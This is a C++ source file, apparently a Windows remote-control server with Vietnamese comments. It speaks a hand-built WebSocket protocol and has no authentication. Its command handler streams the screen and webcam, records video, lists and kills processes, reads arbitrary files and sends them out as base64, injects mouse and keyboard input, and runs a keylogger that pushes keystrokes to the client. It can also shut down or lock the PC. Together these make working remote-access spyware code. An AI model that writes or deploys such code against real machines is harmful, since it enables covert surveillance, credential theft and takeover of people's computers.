#include "WebSocketServer.h"
#include "Stream.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <bcrypt.h> 
#include <cstdio>   
#include "TaskManager.h"
#include "AppManager.h"
#include "SystemControl.h"
#include "InputManager.h"
#include <atomic>

static std::atomic<bool> g_cameraRunning(false);
static std::atomic<bool> g_screenRunning(false);


static std::string base64_encode_manual(const BYTE* data, size_t len) {
    static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    while (len--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}


WebSocketServer::WebSocketServer(const std::string& ip, int port)
    : server_ip(ip), server_port(port), server_socket(INVALID_SOCKET) {
}


WebSocketServer::~WebSocketServer() {
    if (server_socket != INVALID_SOCKET) closesocket(server_socket);
    WSACleanup();
    std::cout << "SERVER TURNED OFF!" << std::endl;
}


bool WebSocketServer::Start(std::atomic<bool>& isRunning) {
    // 1. Tạo Socket
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        std::cerr << "ERROR CREATING SOCKET: " << WSAGetLastError() << "\n";
        return false; 
    }

    // 2. Cấu hình địa chỉ
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(server_port);

    // Xử lý IP "0.0.0.0"
    if (server_ip == "0.0.0.0") {
        serverAddr.sin_addr.s_addr = INADDR_ANY;
    }
    else {
        inet_pton(AF_INET, server_ip.c_str(), &serverAddr.sin_addr);
    }

    // 3. Bind & Listen
    if (bind(server_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "BINDING ERROR " << WSAGetLastError() << "\n";
        Close(); return false;
    }

    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "LISTENING ERROR: " << WSAGetLastError() << "\n";
        Close(); return false;
    }

    std::cout << "SERVER LISTENING AT PORT " << server_port << "...\n";

    // 4. VÒNG LẶP CHÍNH (NON-BLOCKING)
    while (isRunning) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(server_socket, &readfds);

        // Thiết lập thời gian chờ (Timeout) là 1 giây
        timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        int activity = select(0, &readfds, NULL, NULL, &timeout);

        if (activity < 0) {
            std::cerr << "SELECTING ERROR: SERVER STOPPED\n";
            break;
        }

        if (activity == 0) {
            continue;
        }

        // Nếu code chạy đến đây nghĩa là CÓ KẾT NỐI MỚI
        if (FD_ISSET(server_socket, &readfds)) {
            sockaddr_in clientAddr{};
            int clientLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(server_socket, (sockaddr*)&clientAddr, &clientLen);

            if (clientSocket != INVALID_SOCKET) {
                std::cout << "🔗 NEW CLIENT!\n";
                // Detach thread để xử lý riêng client này
                std::thread(&WebSocketServer::handle_client, this, clientSocket).detach();
            }
        }
    }
    Close(); // Đóng socket khi thoát
    return true;
}

void WebSocketServer::handle_client(SOCKET client_socket) {
    if (!perform_handshake(client_socket)) {
        std::cerr << "-> FAILED TO HANDSHAKE OR CLIENT DISCONNECTED" << std::endl;
        closesocket(client_socket);
        return;
    }
    std::cout << "-> CLIENT CONNECTED" << std::endl;

    std::vector<char> frame_buffer;
    std::string payload_data;

    while (true) {
        frame_buffer.clear();
        payload_data.clear();

        if (!receive_frame(client_socket, frame_buffer)) {
            break;
        }

        WebSocketFrameType frame_type = decode_websocket_frame(frame_buffer, payload_data);

        switch (frame_type) {
        case WebSocketFrameType::TEXT_FRAME:
            process_command(client_socket, payload_data);
            break;
        case WebSocketFrameType::CONTROL_FRAME:
            continue;
        case WebSocketFrameType::BINARY_FRAME:
        case WebSocketFrameType::ERROR_FRAME:
        case WebSocketFrameType::INCOMPLETE:
        default:
            std::cerr << "-> GOT ERROR FRAME, CLOSE CONNECTION" << std::endl;
            goto close_connection;
        }
    }
    close_connection:
        std::cout << "-> CLIENT DISCONNECTED" << std::endl;
        closesocket(client_socket);
}


void WebSocketServer::process_command(SOCKET client_socket, const std::string& cmd) {

    // --- PHẦN 1: CAMERA & SCREENSHOT (Giữ nguyên) ---
    if (cmd.find("SCREENSHOT") != std::string::npos) {
        // ... Code Screenshot cũ ...
        std::vector<uchar> jpgData;
        if (m_streamEngine.GetScreenShot(jpgData)) SendImage(client_socket, jpgData);
    }

    else if (cmd == "CMD_OPEN_SCREEN") {
        if (g_cameraRunning) {
            send_data(client_socket, "ERROR:CAMERA_RUNNING", false);
            return;
        }

        std::cout << "-> COMMAND: START SCREEN STREAM" << std::endl;

        g_screenRunning = true;

        send_data(client_socket, "SCREEN_READY", false);

        m_streamEngine.StartScreenStream(
            [this, client_socket](const std::vector<uchar>& frameBuffer) -> bool {
                return this->SendImage(client_socket, frameBuffer);
            }
        );
    }


    else if (cmd == "CMD_CLOSE_SCREEN") {
        m_streamEngine.StopScreenStream();
        g_screenRunning = false;
        send_data(client_socket, "SCREEN_CLOSED", false);
    }



    else if (cmd == "CMD_OPEN_CAM") {

        if (g_screenRunning) {
            send_data(client_socket, "ERROR:SCREEN_RUNNING", false);
            return;
        }

        if (g_cameraRunning) {
            send_data(client_socket, "CAM_READY", false);
            return;
        }

        std::cout << "-> COMMAND: OPEN CAMERA" << std::endl;

        bool started = m_streamEngine.StartCameraStream(
            0,
            [this, client_socket](const std::vector<uchar>& frame) {
                return this->SendImage(client_socket, frame);
            }
        );

        if (!started) {
            send_data(client_socket, "CAM_FAILED", false);
            return;
        }

        g_cameraRunning = true;
        send_data(client_socket, "CAM_READY", false);
    }


    else if (cmd == "CMD_CLOSE_CAM") {
        m_streamEngine.StopCameraStream();
        g_cameraRunning = false;
        send_data(client_socket, "CAM_CLOSED", false);
    }

    else if (cmd == "CAM_REC_START") {
        std::string fileName = "Cam_Rec_" + std::to_string(time(0)) + ".avi";

        if (m_streamEngine.StartCamRecording(fileName, 25)) {
            // Gửi lệnh thông báo tên file về cho Web
            send_data(client_socket, "FILENAME:" + fileName, false);
            send_data(client_socket, "LOG: Webcam recording started", false);
        }
    }
    else if (cmd == "CAM_REC_STOP") {
        m_streamEngine.StopCamRecording();
        send_data(client_socket, "LOG: Webcam recording stopped", false);
    }


    // --- PHẦN 2: PROCESSES (Dữ liệu động Real-time) ---
    else if (cmd == "TASK_LIST") {
        std::cout << "-> COMMAND: TASK_LIST (Processes)" << std::endl;
        // Gọi TaskManager cũ để lấy JSON
        std::string json = TaskManager::GetProcessList();
        send_data(client_socket, json, false);
    }
    else if (cmd.find("TASK_KILL") == 0) {
        std::string pidStr = cmd.substr(10); // "TASK_KILL "
        try {
            int pid = std::stoi(pidStr);
            if (TaskManager::KillProcessByID(pid)) // TaskManager cũ
                send_data(client_socket, "Killed Process PID " + pidStr, false);
            else
                send_data(client_socket, "Error Kill PID " + pidStr, false);
        }
        catch (...) {}
    }

    // --- PHẦN 3: APPLICATIONS (Dữ liệu tĩnh Installed Apps) --- [MỚI TÍCH HỢP]
    else if (cmd == "APP_LIST") {
        std::cout << "-> COMMAND: APP_LIST (Installed Apps)" << std::endl;
        // Gọi AppManager để lấy JSON danh sách cài đặt
        std::string json = AppManager::GetAppListJSON();
        send_data(client_socket, json, false);
    }
    else if (cmd.find("APP_START") == 0) {
        // Format: APP_START C:\Program Files\Google\Chrome\chrome.exe
        std::string path = cmd.substr(10);
        std::cout << "-> COMMAND: APP_START " << path << std::endl;

        DWORD newPid = AppManager::StartApp(path);
        if (newPid > 0)
            send_data(client_socket, "Started App. PID: " + std::to_string(newPid), false);
        else
            send_data(client_socket, "Error: Failed to start app.", false);
    }
    else if (cmd.find("APP_STOP") == 0) {
        // Dùng PID để stop app (vì AppManager cũng map được PID)
        std::string pidStr = cmd.substr(9); // "APP_STOP "
        try {
            int pid = std::stoi(pidStr);
            if (AppManager::StopApp(pid))
                send_data(client_socket, "Stopped App PID " + pidStr, false);
            else
                send_data(client_socket, "Error Stop App PID " + pidStr, false);
        }
        catch (...) {}
    }


    else if (cmd.find("FILE_PULL ") == 0) {
        std::string filePath = cmd.substr(10); // Lấy tên file từ lệnh "FILE_PULL name.avi"
        std::ifstream file(filePath, std::ios::binary);

        if (file.is_open()) {
            // Đọc toàn bộ file vào vector
            std::vector<BYTE> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            // Chuyển sang Base64 (dùng hàm base64_encode_manual bạn đã có)
            std::string encodedContent = base64_encode_manual(buffer.data(), buffer.size());

            // Tạo JSON giả lập để Flask/JS dễ xử lý
            // Cấu trúc: {"file_name": "abc.avi", "file_content": "base64..."}
            std::string jsonResponse = "{\"file_name\":\"" + filePath + "\", \"file_content\":\"" + encodedContent + "\"}";

            send_data(client_socket, jsonResponse, false);
            std::cout << "[FILE] Da gui file: " << filePath << std::endl;
        }
        else {
            send_data(client_socket, "{\"file_content\":\"ERROR\"}", false);
        }
}

    // --- PHẦN 4: REMOTE CONTROL (TeamViewer Style) --- [MỚI]

    // 1. Di chuyển chuột: "MOUSE_MOVE x y" (Ví dụ: MOUSE_MOVE 500 300)
    if (cmd.find("MOUSE_MOVE") == 0) {
        int x, y;
        if (sscanf_s(cmd.c_str(), "MOUSE_MOVE %d %d", &x, &y) == 2) {
            InputManager::MoveMouse(x, y);
        }
    }

    // 2. Click chuột: "MOUSE_CLICK type state" 
    // type: 0(Left), 1(Right)
    // state: 1(Down), 0(Up) -> Client phải gửi event Down riêng và Up riêng để hỗ trợ Drag & Drop
    else if (cmd.find("MOUSE_CLICK") == 0) {
        int type, state;
        if (sscanf_s(cmd.c_str(), "MOUSE_CLICK %d %d", &type, &state) == 2) {
            InputManager::MouseButton(type, state == 1);
        }
    }

    // 3. Cuộn chuột: "MOUSE_SCROLL delta"
    else if (cmd.find("MOUSE_SCROLL") == 0) {
        int delta;
        if (sscanf_s(cmd.c_str(), "MOUSE_SCROLL %d", &delta) == 1) {
            InputManager::MouseScroll(delta);
        }
    }

    // 4. Bàn phím: "KEY_EVENT vkCode state"
    // vkCode: Mã phím Windows (Ví dụ: 65 là 'A', 13 là Enter)
    // state: 1(Down), 0(Up)

    else if (cmd.find("KEY_EVENT") == 0) {
        int vkCode, state;
        if (sscanf_s(cmd.c_str(), "KEY_EVENT %d %d", &vkCode, &state) == 2) {
            InputManager::KeyEvent(vkCode, state == 1);
        }
    }

    // --- PHẦN KHÁC (KEYLOGGING, SHUTDOWN, RESTART) ---
    if (cmd == "KEYLOGGING_ON") {
        if (!m_keylogger.isRunning) {
            std::cout << "-> COMMAND: START KEYLOGGING" << std::endl;
            m_keylogger.Start();

            // Tạo luồng riêng để gửi dữ liệu về, detach để nó tự chạy ngầm
            std::thread(&WebSocketServer::KeyLogSender, this, client_socket).detach();

            send_data(client_socket, "Keylogger Started", false);
        }
    }

    else if (cmd == "KEYLOGGING_OFF") {
        if (m_keylogger.isRunning) {
            std::cout << "-> COMMAND: STOP KEYLOGGING" << std::endl;
            m_keylogger.Stop(); // Khi Stop, biến isRunning = false -> Vòng lặp KeyLogSender sẽ tự thoát
            send_data(client_socket, "Keylogger Stopped", false);
        }
    }

    else if (cmd == "CMD_SHUTDOWN") {
        if (SystemControl::Shutdown()) {
            send_data(client_socket, "SHUTTING DOWN", false);
        }
        else {
            send_data(client_socket, "ERROR: NEED ADMINISTRATION PRIVILAGE", false);
        }
    }

    else if (cmd == "CMD_RESTART") {
        std::cout << "-> COMMAND: RESTART PC" << std::endl;
        if (SystemControl::Restart()) {
            send_data(client_socket, "RESTARTING...", false);
        }
        else {
            send_data(client_socket, "ERROR: NEED ADMINISTRATION PRIVILAGE", false);
        }
    }


    else if (cmd == "CMD_LOCK") {
        std::cout << "-> COMMAND: LOCK PC" << std::endl;
        if (SystemControl::Lock()) {
            send_data(client_socket, "LOCKED", false);
        }
    }
}


bool WebSocketServer::receive_frame(SOCKET client_socket, std::vector<char>& out_frame) {
    char buffer[4096];
    int bytes = recv(client_socket, buffer, sizeof(buffer), 0);

    if (bytes == 0) {
        std::cerr << "   [CHANDOAN] recv() tra ve 0. Client da chu dong dong ket noi (FIN)." << std::endl;
        return false;
    }
    else if (bytes == SOCKET_ERROR) {
        int error = WSAGetLastError();
        std::cerr << "   [CHANDOAN] recv() bi loi SOCKET_ERROR. Ma loi: " << error << std::endl;
        if (error == 10054) std::cerr << "      -> (WSAECONNRESET): Ket noi bi cuong che dong boi Client hoac Firewall." << std::endl;
        if (error == 10053) std::cerr << "      -> (WSAECONNABORTED): Phan mem trong may host da huy bo ket noi." << std::endl;
        return false;
    }

    out_frame.assign(buffer, buffer + bytes);
    return true;
}


bool WebSocketServer::perform_handshake(SOCKET client_socket) {
    char buffer[4096];
    int bytes = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes <= 0) return false;
    buffer[bytes] = '\0';

    std::string request(buffer, bytes);
    std::istringstream request_stream(request);
    std::string line;
    std::map<std::string, std::string> headers;

    std::getline(request_stream, line);
    while (std::getline(request_stream, line) && line != "\r") {
        size_t colon_pos = line.find(':');
        if (colon_pos != std::string::npos) {
            std::string key = line.substr(0, colon_pos);
            std::string value = line.substr(colon_pos + 2);
            if (!value.empty() && value.back() == '\r') value.pop_back();
            headers[key] = value;
        }
    }

    if (headers.find("Upgrade") == headers.end() || headers["Upgrade"] != "websocket" ||
        headers.find("Sec-WebSocket-Key") == headers.end()) return false;

    std::string accept_key = calculate_accept_key(headers["Sec-WebSocket-Key"]);
    std::string response = "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " + accept_key + "\r\n\r\n";

    if (send(client_socket, response.c_str(), response.length(), 0) == SOCKET_ERROR) return false;
    return true;
}


WebSocketFrameType WebSocketServer::decode_websocket_frame(const std::vector<char>& frame, std::string& out_payload) {
    if (frame.size() < 2) return WebSocketFrameType::INCOMPLETE;
    unsigned char opcode = frame[0] & 0x0F;
    bool is_fin = (frame[0] & 0x80) != 0;
    if (!is_fin) return WebSocketFrameType::ERROR_FRAME;
    bool is_masked = (frame[1] & 0x80) != 0;
    if (!is_masked) return WebSocketFrameType::ERROR_FRAME;

    size_t payload_len = frame[1] & 0x7F;
    size_t mask_start = 2;
    if (payload_len == 126) {
        if (frame.size() < 4) return WebSocketFrameType::INCOMPLETE;
        payload_len = ((unsigned char)frame[2] << 8) | (unsigned char)frame[3];
        mask_start = 4;
    }
    else if (payload_len == 127) return WebSocketFrameType::ERROR_FRAME;

    if (frame.size() < mask_start + 4 + payload_len) return WebSocketFrameType::INCOMPLETE;

    unsigned char mask[4];
    for (int i = 0; i < 4; ++i) mask[i] = frame[mask_start + i];
    size_t data_start = mask_start + 4;
    out_payload.clear();
    out_payload.reserve(payload_len);
    for (size_t i = 0; i < payload_len; ++i) out_payload += frame[data_start + i] ^ mask[i % 4];

    switch (opcode) {
    case 0x1: return WebSocketFrameType::TEXT_FRAME;
    case 0x2: return WebSocketFrameType::BINARY_FRAME;
    case 0x8: case 0x9: case 0xA: return WebSocketFrameType::CONTROL_FRAME;
    default: return WebSocketFrameType::ERROR_FRAME;
    }
};


bool WebSocketServer::send_data(SOCKET client_socket, const std::string& data, bool isBinary) {
    std::lock_guard<std::mutex> lock(m_sendMutex);
    size_t data_len = data.size();
    std::vector<unsigned char> frame_header(10);
    size_t header_size = 2;
    frame_header[0] = isBinary ? 0x82 : 0x81;
    if (data_len <= 125) {
        frame_header[1] = data_len;
    }
    else if (data_len <= 65535) {
        frame_header[1] = 126;
        frame_header[2] = (data_len >> 8) & 0xFF;
        frame_header[3] = data_len & 0xFF;
        header_size = 4;
    }
    else {
        frame_header[1] = 127;
        frame_header[6] = (data_len >> 24) & 0xFF;
        frame_header[7] = (data_len >> 16) & 0xFF;
        frame_header[8] = (data_len >> 8) & 0xFF;
        frame_header[9] = data_len & 0xFF;
        header_size = 10;
    }
    if (send(client_socket, (char*)frame_header.data(), header_size, 0) == SOCKET_ERROR) return false;
    size_t total_sent = 0;
    while (total_sent < data_len) {
        int bytes_sent = send(client_socket, data.c_str() + total_sent, data_len - total_sent, 0);
        if (bytes_sent == SOCKET_ERROR) return false;
        total_sent += bytes_sent;
    }
    return true;
};


std::string WebSocketServer::calculate_accept_key(const std::string& client_key) {
    const std::string magic_string = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    std::string combined = client_key + magic_string;
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL; std::vector<BYTE> hash(20);
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, (PBYTE)combined.c_str(), (ULONG)combined.length(), 0);
    BCryptFinishHash(hHash, hash.data(), (ULONG)hash.size(), 0);
    BCryptDestroyHash(hHash); BCryptCloseAlgorithmProvider(hAlg, 0);

    // Gọi hàm base64 mới, an toàn (Đã sửa lỗi Handshake)
    return base64_encode_manual(hash.data(), hash.size());
}


bool WebSocketServer::SendImage(SOCKET clientSocket, const std::vector<uchar>& buffer) {
    std::lock_guard<std::mutex> lock(m_sendMutex);
    size_t data_len = buffer.size();

    // 1. Chuẩn bị Frame Header
    // Tối đa 10 bytes cho header (nếu payload cực lớn)
    std::vector<uint8_t> frame_header;
    frame_header.reserve(10);

    // Byte đầu tiên: FIN=1, RSV=0, Opcode=0x2 (Binary Frame) -> 1000 0010 = 0x82
    frame_header.push_back(0x82);

    // Byte thứ hai trở đi: Payload Length
    if (data_len <= 125) {
        frame_header.push_back(static_cast<uint8_t>(data_len));
    }
    else if (data_len <= 65535) {
        frame_header.push_back(126); // Ký hiệu độ dài nằm ở 2 bytes tiếp theo
        frame_header.push_back((data_len >> 8) & 0xFF);
        frame_header.push_back(data_len & 0xFF);
    }
    else {
        frame_header.push_back(127); // Ký hiệu độ dài nằm ở 8 bytes tiếp theo
        // Ghi 64-bit length (chỉ dùng 32-bit thấp cho đơn giản vì ảnh < 4GB)
        frame_header.push_back(0); frame_header.push_back(0); frame_header.push_back(0); frame_header.push_back(0);
        frame_header.push_back((data_len >> 24) & 0xFF);
        frame_header.push_back((data_len >> 16) & 0xFF);
        frame_header.push_back((data_len >> 8) & 0xFF);
        frame_header.push_back(data_len & 0xFF);
    }

    // 2. Gửi Header trước
    // Lưu ý: ép kiểu sang char* vì hàm send yêu cầu char*
    if (send(clientSocket, (char*)frame_header.data(), (int)frame_header.size(), 0) == SOCKET_ERROR) {
        std::cerr << "Loi gui Header WebSocket: " << WSAGetLastError() << std::endl;
        return false;
    }

    // 3. Gửi nội dung ảnh (Payload)
    // Loop để đảm bảo gửi hết dữ liệu nếu ảnh lớn
    size_t total_sent = 0;
    const char* raw_data = reinterpret_cast<const char*>(buffer.data()); // Ép kiểu con trỏ dữ liệu ảnh

    while (total_sent < data_len) {
        int bytes_sent = send(clientSocket, raw_data + total_sent, (int)(data_len - total_sent), 0);

        if (bytes_sent == SOCKET_ERROR) {
            std::cerr << "Error sending Payload WebSocket: " << WSAGetLastError() << std::endl;
            return false;
        }
        total_sent += bytes_sent;
    }

    return true;
}


void WebSocketServer::Close() {
    if (server_socket != INVALID_SOCKET) {
        closesocket(server_socket);
        server_socket = INVALID_SOCKET;
    }
}


void WebSocketServer::KeyLogSender(SOCKET client_socket) {
    while (m_keylogger.isRunning) {
        // Lấy dữ liệu từ KeyLogger (Hàm GetAndClearLogs bạn đã viết ở câu trước)
        std::vector<std::string> logs = m_keylogger.GetAndClearLogs();

        if (!logs.empty()) {
            std::string logData = "KEYLOGS:"; // Prefix để Client nhận biết
            for (const auto& s : logs) {
                logData += s;
            }
            // Gửi qua WebSocket (Đã được bảo vệ bởi Mutex trong hàm send_data)
            if (!send_data(client_socket, logData, false)) {
                break; // Nếu lỗi gửi (client ngắt kết nối) thì thoát vòng lặp
            }
        }

        // Nghỉ 500ms để không spam gói tin
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}